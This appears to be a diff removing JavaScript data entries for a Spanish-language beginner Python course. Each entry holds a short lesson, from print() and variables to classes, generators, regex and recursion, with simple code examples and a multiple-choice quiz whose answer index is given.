-mk("¿Qué es Python?",[{t:"Un lenguaje de programación",c:"Un lenguaje de programación es un conjunto de instrucciones que le das a una computadora. Python es famoso por ser <strong>fácil de leer y escribir</strong>, casi como leer inglés. Es ideal para principiantes y expertos."},{t:"Historia de Python",c:"Fue creado por <strong>Guido van Rossum</strong> en 1991. Lo llamó así por el grupo de comedia <em>Monty Python</em>. Guido quería un lenguaje divertido, legible y poderoso."},{t:"¿Por qué es tan popular?",c:"Python se usa en <strong>Inteligencia Artificial</strong>, <strong>ciencia de datos</strong>, <strong>desarrollo web</strong> (YouTube, Instagram), <strong>automatización</strong> y hasta videojuegos. Es el lenguaje #1 del mundo según múltiples rankings."},{t:"Tu primer comando: print()",c:"<code>print()</code> muestra cosas en pantalla:<pre>print(\"¡Hola, mundo!\")</pre>Las comillas le dicen a Python que es texto. ¡Ya escribiste tu primer código!"}],"¿Quién creó Python?",["Linus Torvalds","Guido van Rossum","James Gosling","Dennis Ritchie"],1),
-mk("Instalar Python y primer archivo",[{t:"Dos formas de escribir código",c:"1. <strong>Consola interactiva</strong>: escribes y ejecuta al instante.<br>2. <strong>Archivo .py</strong>: guardas el código y lo ejecutas completo. Es lo que se usa en proyectos reales."},{t:"Instalar Python",c:"En Windows/Mac desde <code>python.org</code>. En Linux/Mac suele venir instalado. Verifica con <code>python --version</code>. Debe decir <code>Python 3.x.x</code>."},{t:"Tu primer archivo",c:"Crea <code>hola.py</code> y escribe:<pre>print(\"Hola, mundo\")\nprint(\"Estoy aprendiendo Python\")</pre>Ejecuta con <code>python hola.py</code>."},{t:"Errores comunes",c:"• Olvidar comillas: <code>print(Hola)</code> da error.<br>• Paréntesis faltantes: <code>print \"Hola\"</code> da error.<br>• Python distingue <code>print</code> de <code>Print</code>."}],"¿Qué comando muestra texto?",["echo()","print()","log()","mostrar()"],1),
-mk("Variables y asignación",[{t:"¿Qué es una variable?",c:"Una <strong>caja etiquetada</strong> donde guardas información. Le pones un nombre y dentro va un valor. La usas llamándola por su nombre."},{t:"Crear variables",c:"Con el signo <code>=</code>:<pre>edad = 25\nnombre = \"Ana\"\nprecio = 19.99\nactivo = True</pre>Python guarda cada valor en su cajita."},{t:"Reglas para nombrar",c:"• Empiezan con letra o <code>_</code><br>• No pueden empezar con número<br>• Sin espacios (usa <code>_</code>)<br>• Sensibles a mayúsculas: <code>Edad</code> ≠ <code>edad</code><br>• No uses palabras reservadas (<code>if</code>, <code>for</code>, <code>print</code>)"},{t:"Cambiar valores",c:"<pre>x = 5\nprint(x)  # 5\nx = 10\nprint(x)  # 10\nx = x + 1\nprint(x)  # 11</pre>El valor anterior se reemplaza."}],"¿Cómo se asigna?",["x == 5","x = 5","x := 5","var x"],1),
-mk("Tipos de datos básicos",[{t:"Los 4 tipos fundamentales",c:"• <code>int</code>: enteros (5, -3, 1000)<br>• <code>float</code>: decimales (3.14, -0.5)<br>• <code>str</code>: texto (\"Hola\")<br>• <code>bool</code>: True o False"},{t:"Detectar con type()",c:"<pre>print(type(5))       # &lt;class 'int'&gt;\nprint(type(3.14))    # &lt;class 'float'&gt;\nprint(type(\"Hola\"))  # &lt;class 'str'&gt;\nprint(type(True))    # &lt;class 'bool'&gt;</pre>"},{t:"¿Por qué importa?",c:"No puedes sumar tipos diferentes. <code>5 + \"3\"</code> da error. Pero <code>5 + 3 = 8</code> y <code>\"5\" + \"3\" = \"53\"</code> (concatenación)."},{t:"Conversión de tipos",c:"<pre>int(\"5\")     # 5\nfloat(3)     # 3.0\nstr(100)     # \"100\"\nbool(0)      # False\nbool(1)      # True</pre>"}],"¿Qué tipo es 3.14?",["int","str","float","bool"],2),
-mk("Operadores aritméticos",[{t:"Básicos",c:"• <code>+</code> suma<br>• <code>-</code> resta<br>• <code>*</code> multiplicación<br>• <code>/</code> división (siempre da float)"},{t:"Especiales",c:"• <code>//</code> división entera: <code>10 // 3 = 3</code><br>• <code>%</code> módulo (resto): <code>10 % 3 = 1</code><br>• <code>**</code> potencia: <code>2 ** 3 = 8</code>"},{t:"Orden de operaciones (PEMDAS)",c:"1. Paréntesis <code>()</code><br>2. Exponentes <code>**</code><br>3. Mult/Div <code>* / // %</code><br>4. Suma/Resta <code>+ -</code><br>Ej: <code>2 + 3 * 4 = 14</code>"},{t:"Ejemplo práctico",c:"<pre>n1, n2, n3 = 8, 7, 9\npromedio = (n1 + n2 + n3) / 3\nprint(promedio)  # 8.0</pre>"}],"¿10 % 3?",["3.33","3","1","0"],2),
-mk("Strings (cadenas)",[{t:"¿Qué es?",c:"Secuencia de caracteres entre comillas simples <code>'...'</code> o dobles <code>\"...\"</code>."},{t:"Concatenación",c:"<pre>saludo = \"Hola \" + \"Ana\"\nprint(saludo)  # Hola Ana</pre>No puedes concatenar string con número directamente."},{t:"f-strings (lo mejor)",c:"<pre>nombre = \"Ana\"\nedad = 25\nprint(f\"{nombre} tiene {edad} años\")</pre>Solo pon <code>f</code> antes de las comillas."},{t:"Métodos útiles",c:"<pre>\"hola\".upper()      # HOLA\n\"HOLA\".lower()      # hola\n\"hola mundo\".split() # ['hola', 'mundo']\n\"  hola  \".strip()  # hola\n\"hola\".replace(\"o\",\"a\")  # hala</pre>"}],"¿Cómo unir textos?",["&","+",".","++"],1),
-mk("Entrada del usuario (input)",[{t:"¿Qué es input()?",c:"Pausa el programa y espera a que el usuario escriba. <strong>SIEMPRE devuelve string</strong>."},{t:"Ejemplo básico",c:"<pre>nombre = input(\"¿Cómo te llamas? \")\nprint(f\"Hola, {nombre}!\")</pre>"},{t:"Convertir a número",c:"<pre>edad = int(input(\"Tu edad: \"))\nprint(f\"En 10 años: {edad + 10}\")</pre>Usa <code>int()</code> o <code>float()</code>."},{t:"Programa completo",c:"<pre>nombre = input(\"Nombre: \")\nedad = int(input(\"Edad: \"))\nprint(f\"Hola {nombre}, tienes {edad}\")\nprint(f\"El próximo año: {edad + 1}\")</pre>"}],"¿Qué tipo devuelve input()?",["int","str","float","bool"],1),
-mk("Condicionales: if",[{t:"Tomar decisiones",c:"<code>if</code> ejecuta código <strong>solo si</strong> una condición es verdadera."},{t:"Sintaxis",c:"<pre>if edad >= 18:\n    print(\"Eres mayor\")</pre>Ojo con los <strong>dos puntos</strong> y la <strong>indentación de 4 espacios</strong>."},{t:"Operadores de comparación",c:"• <code>==</code> igual<br>• <code>!=</code> distinto<br>• <code>&gt;</code> mayor<br>• <code>&lt;</code> menor<br>• <code>&gt;=</code> mayor o igual<br>• <code>&lt;=</code> menor o igual"},{t:"Error común",c:"Usar <code>=</code> (asignación) en lugar de <code>==</code> (comparación). <code>if x = 5</code> da error."}],"¿Qué inicia una condición?",["when","if","case","switch"],1),
-mk("if / else",[{t:"¿Qué es else?",c:"Se ejecuta cuando el <code>if</code> es <strong>falso</strong>."},{t:"Ejemplo",c:"<pre>if edad >= 18:\n    print(\"Puedes votar\")\nelse:\n    print(\"No puedes votar\")\n</pre>Solo uno de los dos bloques corre."},{t:"Anidación",c:"<pre>if nota >= 6:\n    if nota >= 9:\n        print(\"Excelente\")\n    else:\n        print(\"Aprobado\")\nelse:\n    print(\"Reprobado\")</pre>Pero es más limpio usar elif."}],"¿Cuándo corre else?",["Siempre","Si if es False","Si if es True","Nunca"],1),
-mk("elif (else if)",[{t:"Múltiples condiciones",c:"<code>elif</code> evalúa condiciones en orden. Python ejecuta la primera que sea verdadera."},{t:"Ejemplo de notas",c:"<pre>nota = 7\nif nota >= 9:\n    print(\"Excelente\")\nelif nota >= 7:\n    print(\"Bien\")\nelif nota >= 5:\n    print(\"Aprobado\")\nelse:\n    print(\"Reprobado\")</pre>Con nota=7 imprime 'Bien'."},{t:"Orden importa",c:"Las condiciones se evalúan de arriba a abajo. Pon las más específicas primero."}],"¿Qué combina if/else?",["elseif","elif","else if","elseif"],1),
-mk("Operadores lógicos",[{t:"and",c:"True solo si <strong>ambas</strong> son True:<pre>if edad > 18 and tiene_id:\n    print(\"Puede entrar\")</pre>"},{t:"or",c:"True si <strong>al menos una</strong> es True:<pre>if es_admin or es_mod:\n    print(\"Tiene permisos\")</pre>"},{t:"not",c:"Invierte el valor:<pre>if not lloviendo:\n    print(\"Salir\")</pre>"},{t:"Combinando",c:"<pre>if (edad > 18 or tiene_permiso) and not es_finde:\n    print(\"Acceso\")</pre>"}],"¿Qué requiere AMBOS True?",["or","not","and","xor"],2),
-mk("Bucle while",[{t:"¿Qué es?",c:"Repite mientras la condición sea True."},{t:"Sintaxis",c:"<pre>contador = 0\nwhile contador < 5:\n    print(contador)\n    contador += 1</pre>Imprime 0-4. <code>contador += 1</code> es clave."},{t:"Cuidado con el infinito",c:"Si la condición nunca se vuelve falsa, el programa se cuelga. Siempre cambia la variable dentro del bucle."},{t:"break y continue",c:"• <code>break</code>: sale del bucle<br>• <code>continue</code>: salta a la siguiente iteración<pre>i = 0\nwhile True:\n    if i == 3:\n        break\n    i += 1</pre>"}],"¿Qué detiene un bucle?",["stop","break","exit","end"],1),
-mk("Bucle for",[{t:"¿Qué es?",c:"Recorre elementos de una secuencia (lista, texto, rango)."},{t:"Sintaxis",c:"<pre>for i in range(5):\n    print(i)</pre>Imprime 0-4."},{t:"Recorrer listas y strings",c:"<pre>frutas = [\"pera\", \"uva\"]\nfor fruta in frutas:\n    print(fruta)\n\nfor letra in \"Hola\":\n    print(letra)</pre>"},{t:"enumerate",c:"<pre>for i, fruta in enumerate(frutas):\n    print(f\"{i}: {fruta}\")</pre>Da índice y valor juntos."}],"¿Cuántas range(3)?",["2","3","4","∞"],1),
-mk("range() en profundidad",[{t:"¿Qué hace?",c:"Genera una secuencia de números. No crea lista real, genera conforme se necesita."},{t:"Tres formas",c:"• <code>range(5)</code> → 0,1,2,3,4<br>• <code>range(2,5)</code> → 2,3,4<br>• <code>range(1,10,2)</code> → 1,3,5,7,9"},{t:"Cuenta atrás",c:"<pre>for i in range(10, 0, -1):\n    print(i)  # 10, 9, 8... 1</pre>El paso puede ser negativo."}],"¿range(1,4)?",["1,2,3,4","1,2,3","0,1,2","2,3,4"],1),
-mk("Listas (introducción)",[{t:"¿Qué es?",c:"Colección <strong>ordenada</strong> entre corchetes <code>[]</code>."},{t:"Crear y acceder",c:"<pre>numeros = [10, 20, 30]\nprint(numeros[0])  # 10\nprint(numeros[2])  # 30</pre>Índices desde <strong>0</strong>."},{t:"Índices negativos",c:"<code>numeros[-1]</code> es el último, <code>numeros[-2]</code> el penúltimo."},{t:"Modificar",c:"<pre>numeros[1] = 99\nprint(numeros)  # [10, 99, 30]</pre>Las listas son <strong>mutables</strong>."}],"¿Índice del primero?",["1","0","-1","Depende"],1),
-mk("Métodos de listas",[{t:"append()",c:"Añade al final:<pre>frutas = [\"pera\"]\nfrutas.append(\"uva\")\nprint(frutas)  # ['pera', 'uva']</pre>"},{t:"pop()",c:"Elimina y devuelve el último:<pre>frutas.pop()  # devuelve 'uva'</pre>También acepta índice: <code>pop(0)</code>"},{t:"Otros métodos",c:"• <code>remove(x)</code>: elimina x<br>• <code>insert(i,x)</code>: inserta x en posición i<br>• <code>len(lista)</code>: tamaño<br>• <code>sort()</code>: ordena<br>• <code>reverse()</code>: invierte"},{t:"Ejemplo",c:"<pre>nums = [3, 1, 4, 1, 5]\nnums.append(9)\nnums.sort()\nprint(nums)     # [1, 1, 3, 4, 5, 9]\nprint(len(nums)) # 6</pre>"}],"¿Qué hace append?",["Elimina","Añade final","Ordena","Invierte"],1),
-mk("Tuplas",[{t:"¿Qué es?",c:"Como lista pero <strong>inmutable</strong>. Se escribe con paréntesis <code>()</code>."},{t:"Cuándo usar",c:"Datos que no deben cambiar: coordenadas, fechas, configuraciones."},{t:"Crear y acceder",c:"<pre>coords = (10, 20)\nprint(coords[0])  # 10</pre>No puedes hacer <code>coords[0] = 5</code>."},{t:"Unpacking",c:"<pre>x, y = (10, 20)\nprint(x)  # 10\nprint(y)  # 20</pre>Asigna cada valor a una variable."}],"¿Inmutable significa?",["Cambia","No modifica","Rápida","Dict"],1),
-mk("Sets (conjuntos)",[{t:"¿Qué es?",c:"Colección <strong>sin orden</strong> y <strong>sin duplicados</strong>. Con llaves <code>{}</code>."},{t:"Eliminar duplicados",c:"<pre>numeros = [1, 2, 2, 3, 3, 3]\nunicos = set(numeros)\nprint(unicos)  # {1, 2, 3}</pre>"},{t:"Operaciones",c:"<pre>a = {1, 2, 3}\nb = {3, 4, 5}\nprint(a | b)  # unión {1,2,3,4,5}\nprint(a & b)  # intersección {3}\nprint(a - b)  # diferencia {1,2}</pre>"},{t:"Add y remove",c:"<pre>s = {1, 2}\ns.add(3)     # {1, 2, 3}\ns.remove(1)  # {2, 3}</pre>No se accede por índice."}],"¿Permite duplicados?",["Sí","No","Solo números","A veces"],1),
-mk("Diccionarios",[{t:"¿Qué es?",c:"Pares <strong>clave: valor</strong>. Cada clave es única."},{t:"Crear y acceder",c:"<pre>persona = {\n    \"nombre\": \"Ana\",\n    \"edad\": 25\n}\nprint(persona[\"nombre\"])  # Ana</pre>"},{t:"get()",c:"Evita errores si la clave no existe:<pre>persona.get(\"altura\", 0)  # 0</pre>"},{t:"Modificar y añadir",c:"<pre>persona[\"edad\"] = 26      # modificar\npersona[\"pais\"] = \"COL\"   # añadir\ndel persona[\"nombre\"]     # eliminar</pre>"}],"¿Cómo acceder?",["dic.n","dic->n","dic[\"n\"]","dic(n)"],2),
-mk("Métodos de diccionarios",[{t:"keys(), values(), items()",c:"<pre>persona = {\"nombre\":\"Ana\",\"edad\":25}\nprint(persona.keys())\nprint(persona.values())\nprint(persona.items())</pre>"},{t:"Iterar con items()",c:"<pre>for clave, valor in persona.items():\n    print(f\"{clave}: {valor}\")</pre>"},{t:"in para verificar",c:"<pre>if \"nombre\" in persona:\n    print(\"Existe\")</pre>"}],"¿Qué devuelve .keys()?",["Valores","Pares","Claves","Tamaño"],2),
-mk("Funciones",[{t:"¿Qué es?",c:"Bloque reutilizable que hace una tarea."},{t:"Definir",c:"<pre>def saludar():\n    print(\"¡Hola!\")\n\nsaludar()</pre>Ojo con los dos puntos y la indentación."},{t:"Parámetros",c:"<pre>def saludar(nombre):\n    print(f\"Hola, {nombre}\")\n\nsaludar(\"Ana\")</pre>"},{t:"return",c:"<pre>def sumar(a, b):\n    return a + b\n\nresultado = sumar(3, 4)  # 7</pre><strong>print</strong> muestra, <strong>return</strong> devuelve."}],"¿Qué define función?",["function","def","fun","void"],1),
-mk("Parámetros y return",[{t:"Parámetros por defecto",c:"<pre>def saludar(nombre=\"mundo\"):\n    print(f\"Hola, {nombre}\")\n\nsaludar()        # Hola, mundo\nsaludar(\"Ana\")    # Hola, Ana</pre>"},{t:"Múltiples valores",c:"<pre>def suma_y_resta(a, b):\n    return a+b, a-b\n\ns, r = suma_y_resta(10, 3)  # s=13, r=7</pre>"},{t:"return vs print",c:"<code>return</code> devuelve el valor para usarlo después. <code>print</code> solo muestra en pantalla."},{t:"Funciones sin return",c:"Si no hay <code>return</code>, la función devuelve <code>None</code> automáticamente."}],"¿Qué devuelve valor?",["print","return","give","send"],1),
-mk("Scope de variables",[{t:"Local vs Global",c:"Una variable dentro de una función es <strong>local</strong>. Las de fuera son <strong>globales</strong>."},{t:"Ejemplo",c:"<pre>x = 10  # global\n\ndef f():\n    x = 5  # local\n    print(x)\n\nf()        # 5\nprint(x)   # 10</pre>"},{t:"global",c:"Para modificar una global dentro de una función:<pre>x = 10\ndef f():\n    global x\n    x = 20\nf()\nprint(x)  # 20</pre>"},{t:"Buenas prácticas",c:"Evita usar <code>global</code>. Es mejor pasar valores como parámetros y devolverlos con <code>return</code>."}],"¿Dónde vive local?",["Todo","Dentro","Módulo","Sistema"],1),
-mk("Módulos e imports",[{t:"¿Qué es un módulo?",c:"Archivo con código Python reutilizable. Python viene con muchos módulos listos."},{t:"import completo",c:"<pre>import math\nprint(math.sqrt(16))  # 4.0\nprint(math.pi)        # 3.14159...</pre>"},{t:"from... import",c:"Importa solo lo que necesitas:<pre>from random import randint\nprint(randint(1, 10))</pre>"},{t:"Alias con as",c:"<pre>import numpy as np\nimport pandas as pd</pre>Útil para nombres largos."}],"¿Qué palabra importa?",["include","require","import","using"],2),
-mk("Librería random",[{t:"randint()",c:"Entero aleatorio entre dos valores:<pre>from random import randint\nprint(randint(1, 6))  # dado del 1 al 6</pre>"},{t:"choice()",c:"Elige un elemento al azar:<pre>from random import choice\nfrutas = [\"pera\", \"uva\", \"mango\"]\nprint(choice(frutas))</pre>"},{t:"shuffle()",c:"Mezcla una lista:<pre>from random import shuffle\nnums = [1, 2, 3, 4, 5]\nshuffle(nums)\nprint(nums)</pre>"},{t:"random()",c:"Número decimal entre 0 y 1:<pre>from random import random\nprint(random())  # ej: 0.7352</pre>"}],"¿Qué hace choice?",["Elige aleatorio","Ordena","Cuenta","Suma"],0),
-mk("Manejo de errores (try/except)",[{t:"¿Qué es?",c:"Sirve para evitar que el programa se cuelgue cuando algo falla."},{t:"try/except básico",c:"<pre>try:\n    num = int(input(\"Número: \"))\nexcept:\n    print(\"¡Eso no es un número!\")\n</pre>"},{t:"Errores específicos",c:"<pre>try:\n    r = 10 / 0\nexcept ZeroDivisionError:\n    print(\"No se puede dividir por cero\")</pre>"},{t:"finally",c:"Se ejecuta siempre, haya error o no:<pre>try:\n    f = open(\"archivo.txt\")\nexcept:\n    print(\"Error\")\nfinally:\n    print(\"Siempre corre\")</pre>"}],"¿Qué bloque siempre corre?",["except","finally","else","catch"],1),
-mk("Archivos (leer/escribir)",[{t:"Modos",c:"<code>'r'</code> leer, <code>'w'</code> escribir (borra), <code>'a'</code> añadir."},{t:"Escribir",c:"<pre>with open(\"datos.txt\", \"w\") as f:\n    f.write(\"Hola mundo\")</pre>"},{t:"Leer",c:"<pre>with open(\"datos.txt\", \"r\") as f:\n    contenido = f.read()\n    print(contenido)</pre>"},{t:"¿Por qué with?",c:"<code>with</code> cierra el archivo automáticamente, incluso si hay error. Siempre úsalo."}],"¿Modo escritura?",["'r'","'w'","'x'","'z'"],1),
-mk("Clases y objetos",[{t:"¿Qué es una clase?",c:"Un <strong>molde</strong> para crear objetos. Cada objeto tiene atributos (datos) y métodos (funciones)."},{t:"Definir una clase",c:"<pre>class Perro:\n    def __init__(self, nombre):\n        self.nombre = nombre\n\n    def ladrar(self):\n        print(\"¡Guau!\")</pre>"},{t:"Crear objetos",c:"<pre>mi_perro = Perro(\"Rex\")\nprint(mi_perro.nombre)  # Rex\nmi_perro.ladrar()       # ¡Guau!</pre>"},{t:"self",c:"<code>self</code> se refiere al objeto mismo. Siempre va como primer parámetro."}],"¿Método al crear?",["__start__","__init__","__new__","__create__"],1),
-mk("Herencia",[{t:"¿Qué es?",c:"Una clase puede heredar atributos y métodos de otra."},{t:"Sintaxis",c:"<pre>class Animal:\n    def comer(self):\n        print(\"Comiendo...\")\n\nclass Gato(Animal):\n    def maullar(self):\n        print(\"Miau\")</pre>"},{t:"Usar",c:"<pre>g = Gato()\ng.comer()    # heredado\ng.maullar()  # propio</pre>"},{t:"super()",c:"Llama al método del padre:<pre>class Gato(Animal):\n    def __init__(self):\n        super().__init__()</pre>"}],"¿Cómo hereda?",["extends","inherits",":","(Padre)"],3),
-mk("Polimorfismo",[{t:"¿Qué es?",c:"Mismo método, distinto comportamiento según la clase."},{t:"Ejemplo",c:"<pre>class Perro:\n    def hablar(self):\n        return \"Guau\"\n\nclass Gato:\n    def hablar(self):\n        return \"Miau\"</pre>"},{t:"Usarlo",c:"<pre>for animal in [Perro(), Gato()]:\n    print(animal.hablar())\n# Guau\n# Miau</pre>"},{t:"Ventaja",c:"Puedes tratar objetos diferentes de forma uniforme."}],"¿Qué permite?",["Herencia","Mismo método distinto","Globales","Bucles"],1),
-mk("List comprehension",[{t:"¿Qué es?",c:"Forma compacta de crear listas."},{t:"Sintaxis",c:"<pre>nums = [x*2 for x in range(5)]\nprint(nums)  # [0, 2, 4, 6, 8]</pre>"},{t:"Con filtro",c:"<pre>pares = [x for x in range(10) if x % 2 == 0]\nprint(pares)  # [0, 2, 4, 6, 8]</pre>"},{t:"Anidado",c:"<pre>pares = [x for x in [1,2,3,4,5] if x>2]</pre>Lee: 'dame x para cada x en la lista si x>2'."}],"¿[x*2 for x in [1,2]]?",["[2,4]","[1,4]","[1,2]","Error"],0),
-mk("Lambda",[{t:"¿Qué es?",c:"Función anónima de una sola línea."},{t:"Sintaxis",c:"<pre>cuadrado = lambda x: x**2\nprint(cuadrado(5))  # 25</pre>"},{t:"Con sorted()",c:"<pre>personas = [(\"Ana\",25),(\"Luis\",30)]\nordenadas = sorted(personas, key=lambda p: p[1])\nprint(ordenadas)</pre>"},{t:"Con map/filter",c:"<pre>nums = [1,2,3]\ndobles = list(map(lambda x: x*2, nums))\n# [2, 4, 6]</pre>"}],"¿Palabra de lambda?",["def","func","lambda","fn"],2),
-mk("map y filter",[{t:"map()",c:"Aplica una función a cada elemento:<pre>nums = [1,2,3]\ndobles = list(map(lambda x: x*2, nums))\n# [2, 4, 6]</pre>"},{t:"filter()",c:"Filtra según condición:<pre>pares = list(filter(lambda x: x%2==0, [1,2,3,4]))\n# [2, 4]</pre>"},{t:"Combinar",c:"<pre>nums = [1,2,3,4,5]\nresultado = list(map(lambda x: x**2, filter(lambda x: x%2==0, nums)))\n# [4, 16]</pre>"}],"¿Qué hace filter?",["Transforma","Filtra","Ordena","Suma"],1),
-mk("Decoradores",[{t:"¿Qué es?",c:"Función que envuelve a otra para añadir comportamiento."},{t:"Sintaxis",c:"<pre>@mi_decorador\ndef funcion():\n    pass</pre>"},{t:"Ejemplo",c:"<pre>def decorador(f):\n    def wrapper():\n        print(\"Antes\")\n        f()\n        print(\"Después\")\n    return wrapper\n\n@decorador\ndef saludar():\n    print(\"Hola\")\n\nsaludar()\n# Antes\n# Hola\n# Después</pre>"},{t:"Útiles para",c:"Logging, medir tiempo, cachear, autenticación."}],"¿Símbolo de decorador?",["#","@","&","$"],1),
-mk("Generadores",[{t:"¿Qué es?",c:"Función que devuelve valores de uno en uno en lugar de toda la lista."},{t:"yield",c:"<pre>def gen():\n    yield 1\n    yield 2\n    yield 3\n\nfor x in gen():\n    print(x)</pre>"},{t:"Ventaja",c:"Ahorra memoria: no crea toda la lista de golpe."},{t:"Generador infinito",c:"<pre>def infinito():\n    i = 0\n    while True:\n        yield i\n        i += 1</pre>Útil para streams."}],"¿Palabra de generador?",["return","yield","give","send"],1),
-mk("Expresiones regulares",[{t:"¿Qué es?",c:"Patrones para buscar texto. Se usa el módulo <code>re</code>."},{t:"Búsqueda básica",c:"<pre>import re\ntexto = \"Tengo 25 años\"\nr = re.search(r\"\\d+\", texto)\nprint(r.group())  # 25</pre>"},{t:"Patrones útiles",c:"• <code>\\d</code> dígito<br>• <code>\\w</code> letra/palabra<br>• <code>\\s</code> espacio<br>• <code>+</code> uno o más<br>• <code>*</code> cero o más<br>• <code>.</code> cualquier carácter"},{t:"replace con regex",c:"<pre>nuevo = re.sub(r\"\\d+\", \"X\", \"Hoy es 2024\")\nprint(nuevo)  # Hoy es X</pre>"}],"¿Módulo regex?",["regex","re","regexp","rx"],1),
-mk("JSON",[{t:"¿Qué es?",c:"Formato de texto para intercambiar datos. Muy usado en APIs."},{t:"Cargar (str → dict)",c:"<pre>import json\ntexto = '{\"nombre\":\"Ana\",\"edad\":25}'\ndatos = json.loads(texto)\nprint(datos[\"nombre\"])  # Ana</pre>"},{t:"Guardar (dict → str)",c:"<pre>dic = {\"nombre\":\"Ana\"}\ntexto = json.dumps(dic)\nprint(texto)  # {\"nombre\": \"Ana\"}</pre>"},{t:"Con archivos",c:"<pre>with open(\"datos.json\", \"w\") as f:\n    json.dump(dic, f)</pre>"}],"¿json.loads?",["A string","A dict","Elimina","Ordena"],1),
-mk("Errores comunes",[{t:"TypeError",c:"Sumar tipos incompatibles: <code>1 + \"a\"</code>"},{t:"IndexError",c:"Acceder a un índice fuera de rango: <code>[1,2][5]</code>"},{t:"KeyError",c:"Acceder a clave inexistente en dict: <code>{\"a\":1}[\"b\"]</code>"},{t:"ValueError",c:"Conversión inválida: <code>int(\"hola\")</code>"},{t:"Leer el error",c:"Python te dice línea y tipo. Léelo de abajo hacia arriba para encontrar la causa."}],"¿Error de 1+\"a\"?",["ValueError","TypeError","IndexError","KeyError"],1),
-mk("Proyecto: Calculadora",[{t:"Objetivo",c:"Aplicar todo lo aprendido creando una calculadora."},{t:"Código",c:"<pre>def calc(a, b, op):\n    if op == '+': return a + b\n    elif op == '-': return a - b\n    elif op == '*': return a * b\n    elif op == '/': return a / b\n    else: return \"Op inválida\"\n\nn1 = float(input(\"N1: \"))\nn2 = float(input(\"N2: \"))\nop = input(\"Operación (+,-,*,/): \")\nprint(calc(n1, n2, op))</pre>"},{t:"Mejoras",c:"• Bucle while para repetir<br>• try/except para errores<br>• Historial de operaciones<br>• Interfaz con tkinter"},{t:"¡Felicidades!",c:"Ya sabes lo básico de Python. Ahora practica mucho y sigue al curso de Hacking."}],"¿Qué usar para elegir?",["Bucle","Condicionales","Clases","Listas"],1),
-mk("Slicing (rebanado)",[{t:"¿Qué es?",c:"Extraer una parte de una secuencia."},{t:"Sintaxis",c:"<code>secuencia[inicio:fin:paso]</code> (fin sin incluir)"},{t:"Ejemplos",c:"<pre>nums = [0,1,2,3,4,5]\nprint(nums[1:4])   # [1,2,3]\nprint(nums[:3])    # [0,1,2]\nprint(nums[3:])    # [3,4,5]\nprint(nums[::2])   # [0,2,4]\nprint(nums[::-1])  # [5,4,3,2,1,0]</pre>"},{t:"Con strings",c:"<pre>texto = \"Python\"\nprint(texto[0:3])   # Pyt\nprint(texto[::-1])  # nohtyP</pre>"}],"¿[1,2,3,4][::2]?",["[1,3]","[2,4]","[1,2]","[3,4]"],0),
-mk("Listas anidadas",[{t:"¿Qué son?",c:"Listas dentro de listas (matrices)."},{t:"Crear",c:"<pre>matriz = [[1,2,3],\n          [4,5,6],\n          [7,8,9]]</pre>"},{t:"Acceder",c:"<pre>print(matriz[0])     # [1, 2, 3]\nprint(matriz[0][1])  # 2\nprint(matriz[2][2])  # 9</pre>Primero fila, luego columna."},{t:"Recorrer",c:"<pre>for fila in matriz:\n    for num in fila:\n        print(num, end=\" \")\n    print()</pre>"}],"¿matriz[0][1]?",["[1,2]","2","4","[3,4]"],1),
-mk("Sort vs sorted",[{t:"sort()",c:"Modifica la lista original:<pre>nums = [3, 1, 2]\nnums.sort()\nprint(nums)  # [1, 2, 3]</pre>"},{t:"sorted()",c:"Devuelve una nueva lista ordenada:<pre>nums = [3, 1, 2]\nordenados = sorted(nums)\nprint(nums)      # [3, 1, 2]\nprint(ordenados) # [1, 2, 3]</pre>"},{t:"reverse",c:"<code>reverse=True</code> para descendente:<pre>sorted([3,1,2], reverse=True)  # [3, 2, 1]</pre>"},{t:"Con key",c:"Ordenar por criterio:<pre>personas = [(\"Ana\",25),(\"Luis\",30)]\nprint(sorted(personas, key=lambda p: p[1]))</pre>"}],"¿Cuál modifica?",["sort()","sorted()","order()","arrange()"],0),
-mk("enumerate",[{t:"¿Qué hace?",c:"Recorre una lista dando índice y valor a la vez."},{t:"Sintaxis",c:"<pre>frutas = [\"pera\", \"uva\", \"mango\"]\nfor i, fruta in enumerate(frutas):\n    print(f\"{i}: {fruta}\")</pre>"},{t:"Empezar en 1",c:"<code>enumerate(frutas, start=1)</code> empieza el índice en 1."},{t:"Sin enumerate",c:"Sería: <pre>for i in range(len(frutas)):\n    print(i, frutas[i])</pre>Pero enumerate es más limpio."}],"¿Qué da enumerate?",["Valores","Índice y valor","Índices","Nada"],1),
-mk("zip",[{t:"¿Qué hace?",c:"Une dos o más listas en pares."},{t:"Sintaxis",c:"<pre>nombres = [\"Ana\", \"Luis\"]\nedades = [25, 30]\nfor n, e in zip(nombres, edades):\n    print(f\"{n}: {e}\")\n# Ana: 25\n# Luis: 30</pre>"},{t:"Crear dict",c:"<pre>dic = dict(zip(nombres, edades))\n# {'Ana': 25, 'Luis': 30}</pre>"},{t:"Nota",c:"zip se detiene en la lista más corta."}],"¿Qué hace zip?",["Une pares","Separa","Ordena","Suma"],0),
-mk("*args y **kwargs",[{t:"*args",c:"Recibe múltiples argumentos posicionales como tupla:<pre>def suma(*args):\n    return sum(args)\n\nprint(suma(1,2,3,4))  # 10</pre>"},{t:"**kwargs",c:"Recibe argumentos con nombre como dict:<pre>def mostrar(**kwargs):\n    for k, v in kwargs.items():\n        print(f\"{k}: {v}\")\n\nmostrar(nombre=\"Ana\", edad=25)</pre>"},{t:"Combinar",c:"<pre>def f(a, *args, **kwargs):\n    print(a, args, kwargs)</pre>"}],"¿Qué es *args?",["Lista","Tupla","Dict","Set"],1),
-mk("Closures",[{t:"¿Qué es?",c:"Función interna que recuerda variables del scope externo."},{t:"Ejemplo",c:"<pre>def multiplicador(n):\n    def multiplicar(x):\n        return x * n\n    return multiplicar\n\ndoble = multiplicador(2)\ntriple = multiplicador(3)\nprint(doble(5))   # 10\nprint(triple(5))  # 15</pre>"},{t:"Uso",c:"Útil para crear funciones especializadas."}],"¿Qué recuerda un closure?",["Nada","Entorno","Archivos","CPU"],1),
-mk("Recursión",[{t:"¿Qué es?",c:"Función que se llama a sí misma."},{t:"Caso base",c:"¡Siempre debe haber un caso que detenga la recursión!"},{t:"Factorial",c:"<pre>def factorial(n):\n    if n <= 1:\n        return 1\n    return n * factorial(n - 1)\n\nprint(factorial(5))  # 120</pre>"},{t:"Fibonacci",c:"<pre>def fib(n):\n    if n < 2: return n\n    return fib(n-1) + fib(n-2)</pre>Cuidado: sin memoization es lento."}],"¿Necesita qué?",["Bucle","Caso base","Lista","Print"],1),
